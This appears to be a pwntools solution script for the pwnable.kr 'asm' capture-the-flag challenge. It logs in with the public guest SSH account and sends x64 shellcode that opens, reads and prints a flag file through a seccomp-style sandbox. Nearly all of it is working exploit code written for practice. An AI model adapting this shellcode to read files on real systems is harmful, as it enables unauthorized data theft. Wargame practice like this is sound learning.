from pwn import *

LONG_FILE_NAME = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
FLAG_SIZE = 32

# Establish connection and reading input
s = ssh(user="asm", host="pwnable.kr", port=2222, password="guest")
sh = s.remote(host="127.0.0.1", port=9026)
print(sh.recvuntil("give me your x64 shellcode: ").decode())

# Build shellcode
context.arch = "amd64"

shellcode = shellcraft.amd64.open(LONG_FILE_NAME)   # Now the output FD is stored at RAX
shellcode += f"\tsub rsp, {FLAG_SIZE}\n"            # "Allocating" space for a buffer on the stack

# Keeping the address of the buffer we created in RBX
shellcode += shellcraft.amd64.mov("rbx", "rsp")     
shellcode += f"\tadd rbx, {FLAG_SIZE}\n"

# Reading the flag file (FD is at RAX) to the buffer we allocated on the stack
shellcode += shellcraft.amd64.read("rax", "rbx", FLAG_SIZE)

# Writing the buffer into stdout
shellcode += shellcraft.amd64.write(1, f"rbx", FLAG_SIZE)

print(shellcode.rstrip())

# Let's hope for good :)
sh.sendline(asm(shellcode))
print(sh.recv().decode())

sh.close()
s.close()
